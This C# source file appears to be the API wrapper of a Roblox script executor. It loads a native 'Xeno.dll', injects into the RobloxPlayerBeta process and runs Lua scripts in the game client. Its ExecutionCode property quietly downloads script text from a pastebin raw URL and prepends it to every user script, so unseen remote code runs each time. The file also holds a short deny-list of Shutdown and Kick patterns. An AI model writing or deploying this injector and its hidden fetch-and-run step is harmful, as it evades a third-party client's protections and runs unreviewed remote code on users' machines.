using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace SaturnApi
{
    public static class Api
    {
        private const string DllName = "Xeno.dll";

        [DllImport(DllName, CallingConvention = CallingConvention.Cdecl)]
        private static extern void Initialize(bool useConsole);

        [DllImport(DllName, CallingConvention = CallingConvention.Cdecl)]
        private static extern void Attach();

        [DllImport(DllName, CallingConvention = CallingConvention.Cdecl)]
        private static extern IntPtr GetClients();

        [DllImport(DllName, CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Ansi)]
        private static extern void Execute(byte[] scriptSource, int[] PIDs, int numUsers);

        private static bool _isInjected;
        private static bool _initialized;
        private static List<ClientInfo> _cachedClients = new List<ClientInfo>();
        private static DateTime _lastClientFetchTime = DateTime.MinValue;
        private const int CacheDurationMs = 500;

        public static void Inject()
        {
            if (!_initialized)
            {
                Initialize(false);
                _initialized = true;
            }
            var proc = Process.GetProcessesByName("RobloxPlayerBeta").FirstOrDefault();
            if (proc != null)
            {
                try
                {
                    proc.WaitForInputIdle(5000);
                }
                catch { }
            }

            Thread.Sleep(2000);

            Attach();
            WaitForClients();
            _isInjected = GetClientsList().Count > 0;
        }


        public static bool IsInjected() => _isInjected;

        public static bool IsRobloxOpen()
        {
            return Process.GetProcessesByName("RobloxPlayerBeta").Any();
        }

        public static void KillRoblox()
        {
            foreach (var proc in Process.GetProcessesByName("RobloxPlayerBeta"))
            {
                try { proc.Kill(); } catch { }
            }
        }

        private static readonly string[] DangerousPatterns = new[]
        {
            @"game\s*:\s*Shutdown\s*\(",
            @"LocalPlayer\s*:\s*Kick\s*\(",
        };

        private static bool IsScriptDangerous(string source)
        {
            foreach (var pattern in DangerousPatterns)
            {
                if (Regex.IsMatch(source, pattern, RegexOptions.IgnoreCase))
                    return true;
            }
            return false;
        }

        public static void Execute(string scriptSource)
        {
            var clients = GetClientsList();
            if (clients.Count == 0) return;

            if (IsScriptDangerous(scriptSource))
            {
                return;
            }

            int[] ids = clients.Select(c => c.Id).ToArray();

            string fullScript = ExecutionCode + "\n" + scriptSource;
            byte[] scriptBytes = Encoding.UTF8.GetBytes(fullScript + "\0");
            Execute(scriptBytes, ids, ids.Length);
        }

        public static List<ClientInfo> GetClientsList()
        {
            if ((DateTime.Now - _lastClientFetchTime).TotalMilliseconds < CacheDurationMs)
                return new List<ClientInfo>(_cachedClients);

            List<ClientInfo> freshClients = new List<ClientInfo>();
            IntPtr ptr = GetClients();
            if (ptr == IntPtr.Zero) return freshClients;

            string raw = Marshal.PtrToStringAnsi(ptr);
            if (string.IsNullOrWhiteSpace(raw)) return freshClients;

            var matches = Regex.Matches(raw, "\\[\\s*(\\d+),\\s*\"(.*?)\",\\s*\"(.*?)\",\\s*(\\d+)\\s*\\]");
            foreach (Match match in matches)
            {
                ClientInfo client = new ClientInfo
                {
                    Id = int.Parse(match.Groups[1].Value),
                    Name = match.Groups[2].Value,
                    Version = match.Groups[3].Value,
                    State = int.Parse(match.Groups[4].Value)
                };
                freshClients.Add(client);
            }

            _cachedClients = freshClients;
            _lastClientFetchTime = DateTime.Now;

            return new List<ClientInfo>(_cachedClients);
        }

        private static void WaitForClients(int timeoutMs = 3000, int pollInterval = 100)
        {
            int waited = 0;
            while (waited < timeoutMs)
            {
                if (GetClientsList().Count > 0)
                    break;

                System.Threading.Thread.Sleep(pollInterval);
                waited += pollInterval;
            }
        }

        public struct ClientInfo
        {
            public int Id;
            public string Name;
            public string Version;
            public int State;
        }

        private static string _executionCodeCache;

        private static string ExecutionCode
        {
            get
            {
                if (!string.IsNullOrEmpty(_executionCodeCache)) return _executionCodeCache;

                try
                {
                    using (var client = new WebClient())
                    {
                        client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                        _executionCodeCache = client.DownloadString("https://pastebin.com/raw/G2uGmNUd");
                    }
                }
                catch
                {
                    _executionCodeCache = "";
                }

                return _executionCodeCache;
            }
        }
    }
}